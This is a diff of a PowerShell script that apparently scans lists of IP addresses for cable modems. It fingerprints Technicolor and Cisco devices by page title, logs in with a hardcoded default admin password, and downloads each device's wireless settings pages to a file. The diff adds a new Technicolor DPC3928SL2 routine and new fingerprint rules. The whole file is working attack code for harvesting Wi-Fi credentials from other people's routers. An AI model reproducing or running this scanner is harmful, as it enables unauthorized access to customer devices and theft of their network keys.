@@ -120,12 +120,19 @@ echo "$ip - Cisco DPC2420"
 
 #Technicolor CGA0101
 function techCGA0101($ip){
-echo "$ip - Technicolor Nuevos" 
-        curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
-		curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
-		verifyFile
+	echo "$ip - Technicolor CGA0101" 
+    curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
+	curl -o $save --connect-timeout 10 -m 60 -s -H 'Host: $ip' -H 'Accept: */*' -H 'X-CSRF-TOKEN: ' -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --compressed http://$ip/Wir_WirelessAPI.json;
+	verifyFile
 }
 
+# Technicolor DPC3928SL2 
+function techDPC3928SL2($ip){
+	echo "$ip - Technicolor DPC3928SL2" 
+    curl --connect-timeout 3 -s -m 10 -H 'Host: $ip' -H 'Cache-Control: max-age=0' -H 'Origin: http://$ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --data "username_login=admin&password_login=Uq-4GIt3M&Language_English=1&login=Log+In&todo=&this_file=Docsis_system.htm&next_file=Docsis_system.htm&message=%40msg_text%23" --compressed http://$ip/goform/Docsis_system | out-null;
+	curl -o $save --connect-timeout 3 -m 60 -s -H 'Host: $ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/WPS.asp' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --compressed http://$ip/WRadioSettings.asp;
+    verifyFile
+}
 function runScanner(){
 	setup
 	foreach($line in Get-Content .\NATIp.txt) {
@@ -141,7 +148,8 @@ function runScanner(){
 				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoAuth $line; break}
 				".*<title>Cisco Cable Modem</title>.*"  {ciscoAuth $line; break}
 				".*<title>Common UI</title>.*" {techCGA0101 $line; break}
-
+				".*vt_docsystem.*" {techDPC3928SL2 $line; break}
+				".*CGNV2.*" {hitron $line; break}
 				default {$title; Break}
 			}
 		}
